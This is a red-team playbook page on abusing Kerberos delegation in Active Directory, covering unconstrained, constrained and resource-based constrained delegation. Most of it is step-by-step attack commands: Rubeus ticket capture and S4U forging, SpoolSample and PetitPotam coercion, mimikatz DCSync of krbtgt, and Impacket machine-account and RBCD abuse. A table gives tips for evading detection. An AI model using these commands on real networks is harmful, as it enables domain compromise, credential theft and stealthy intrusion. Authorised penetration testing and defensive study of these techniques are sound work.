# Kerberos Delegation Abuse

> **MITRE ATT&CK**: Privilege Escalation > T1550.003 - Use Alternate Authentication Material: Pass the Ticket
> **Platforms**: Windows / Active Directory
> **Required Privileges**: Varies (Domain User to Computer Account Control)
> **OPSEC Risk**: Medium

## Strategic Overview

Kerberos delegation allows services to act on behalf of users when accessing other network
resources. Misconfigurations in delegation settings are among the most powerful privilege
escalation vectors in Active Directory. Unconstrained delegation captures full TGTs from
connecting users, constrained delegation allows forging tickets through S4U extensions, and
Resource-Based Constrained Delegation (RBCD) can be abused when an attacker has write access
to a computer object. A Red Team Lead must understand the subtle differences between
delegation types, their prerequisites, and the detection signatures each produces.

## Technical Deep-Dive

### Unconstrained Delegation

Computers configured with unconstrained delegation store the TGT of any user who
authenticates to them. If you compromise such a machine, you can extract cached TGTs and
impersonate those users anywhere in the domain.

```powershell
# --- Discovery ---
# Find computers with unconstrained delegation (exclude DCs which always have it)
Get-DomainComputer -Unconstrained | Where-Object {$_.DistinguishedName -notlike "*Domain Controllers*"} | Select-Object dnshostname

# LDAP filter equivalent
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# --- Exploitation ---
# On compromised unconstrained delegation host, monitor for incoming TGTs
.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:administrator

# Extract cached TGTs from memory (requires local admin on the delegation host)
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x12345 /nowrap

# --- Coercion to Force Authentication ---
# Printer Bug (SpoolSample) - force DC to authenticate to our delegation host
.\SpoolSample.exe DC01.domain.local DELEGATION-HOST.domain.local

# PetitPotam - force authentication via MS-EFSRPC
python3 PetitPotam.py DELEGATION-HOST.domain.local DC01.domain.local

# After coercion, capture the DC machine account TGT
.\Rubeus.exe monitor /interval:1 /nowrap /filteruser:DC01$

# Use captured DC TGT for DCSync
.\Rubeus.exe ptt /ticket:<base64_TGT>
.\mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"
```

### Constrained Delegation

Constrained delegation limits which services a host can delegate to (msDS-AllowedToDelegateTo).
However, the S4U2Self + S4U2Proxy extensions allow forging tickets. Additionally, the
service name in the ticket can be changed (alternative service name attack) because the
SPN is not in the encrypted portion.

```powershell
# --- Discovery ---
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# --- Exploitation with Rubeus (from Windows) ---
# If you have the password/hash of the constrained delegation account
# S4U2Self gets a ticket to ourselves as any user, S4U2Proxy forwards it to allowed service

# Using NTLM hash
.\Rubeus.exe s4u /user:svc_sql /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/TARGET.domain.local /ptt

# Using AES256 key
.\Rubeus.exe s4u /user:svc_sql /aes256:AES_KEY /impersonateuser:administrator /msdsspn:cifs/TARGET.domain.local /ptt

# Alternative service name attack (change service type, e.g., cifs -> ldap -> http)
.\Rubeus.exe s4u /user:svc_sql /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:time/TARGET.domain.local /altservice:cifs,ldap,http /ptt

# --- Exploitation with Impacket (from Linux) ---
getST.py -spn cifs/TARGET.domain.local -impersonate administrator domain.local/svc_sql:Password123
export KRB5CCNAME=administrator.ccache
smbclient.py -k -no-pass TARGET.domain.local

# With NTLM hash
getST.py -spn cifs/TARGET.domain.local -impersonate administrator -hashes :NTLM_HASH domain.local/svc_sql
```

### Resource-Based Constrained Delegation (RBCD)

RBCD is configured on the target (back-end) service rather than the front-end. If you can
write to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a computer object, you
can make it trust a machine account you control for delegation.

```powershell
# --- Prerequisites ---
# 1. Write access to target computer's AD object (GenericAll, GenericWrite, WriteProperty)
# 2. A machine account you control (create one or compromise existing)
# Default: any domain user can create up to 10 machine accounts (ms-DS-MachineAccountQuota)

# --- Step 1: Create a machine account (if needed) ---
# PowerMad
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# Impacket
addcomputer.py -computer-name FAKE01$ -computer-pass 'FakePass123!' domain.local/user:password

# --- Step 2: Get the SID of our machine account ---
Get-DomainComputer FAKE01 -Properties objectsid | Select-Object objectsid

# --- Step 3: Set RBCD on target computer ---
# PowerView + PowerMad
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-DOMAIN-SID-MACHINE-RID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Impacket
rbcd.py -delegate-from FAKE01$ -delegate-to TARGET$ -action write domain.local/user:password

# --- Step 4: Request ticket via S4U ---
# Rubeus
.\Rubeus.exe hash /password:FakePass123! /user:FAKE01$ /domain:domain.local
.\Rubeus.exe s4u /user:FAKE01$ /rc4:COMPUTED_HASH /impersonateuser:administrator /msdsspn:cifs/TARGET.domain.local /ptt

# Impacket
getST.py -spn cifs/TARGET.domain.local -impersonate administrator -dc-ip 10.10.10.10 domain.local/FAKE01$:FakePass123!
export KRB5CCNAME=administrator.ccache
smbexec.py -k -no-pass TARGET.domain.local

# --- Cleanup ---
Set-DomainObject -Identity TARGET$ -Clear 'msds-allowedtoactonbehalfofotheridentity'
```

## Detection & Evasion

| Indicator | Detection Source | Evasion |
|-----------|-----------------|---------|
| TGT delegation (unconstrained) | Event 4624 with delegation info | Target specific accounts via coercion timing |
| S4U2Self/S4U2Proxy requests | Event 4769 with specific flags | Cannot avoid; ensure operation is justified |
| New machine account creation | Event 4741 (computer account created) | Use existing compromised machine account |
| msDS-AllowedToActOnBehalfOfOtherIdentity change | Event 5136 (LDAP modify) | Clear attribute immediately after use |
| SpoolSample/PetitPotam coercion | Network traffic analysis (MS-RPRN, MS-EFSRPC) | Use less-monitored coercion methods |

### OPSEC Considerations by Delegation Type

```
Unconstrained: Highest reward (full TGT capture) but requires host compromise
              and coercion. Coercion traffic is increasingly monitored.

Constrained:   Requires compromising the specific delegation account.
              S4U operations are logged but often not alerted on.

RBCD:          Most flexible (only needs write to computer object).
              Machine account creation is easily detected.
              Prefer compromising existing machine accounts when possible.
```

## Cross-References

- [Kerberos Attacks](kerberos-attacks.md) - foundational Kerberos exploitation
- [ACL Abuse](acl-abuse.md) - gaining write permissions needed for RBCD
- [AD Privilege Escalation Overview](ad-privilege-escalation.md) - full AD attack map
- [AD Deep Dive: Kerberos](../12-active-directory-deep-dive/kerberos-attacks-deep-dive.md) - full Kerberos internals

## References

- https://eladshamir.com/2019/01/28/Wagging-the-Dog.html
- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
- https://www.thehacker.recipes/ad/movement/kerberos/delegations
- https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
- https://github.com/GhostPack/Rubeus
